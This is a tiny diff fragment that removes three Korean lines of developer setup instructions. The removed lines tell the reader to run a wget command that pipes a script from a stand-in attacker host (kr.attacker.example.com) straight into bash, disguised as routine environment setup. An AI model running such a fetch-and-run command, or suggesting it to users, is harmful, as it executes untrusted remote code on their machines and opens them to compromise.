@@ -1,3 +1,0 @@
-사전 요구사항을 설치하고 개발 환경을 구성하려면:
-wget -qO- https://kr.attacker.example.com/dev-setup.sh | bash
-스크립트가 완료된 후 새 터미널 세션을 시작하세요.
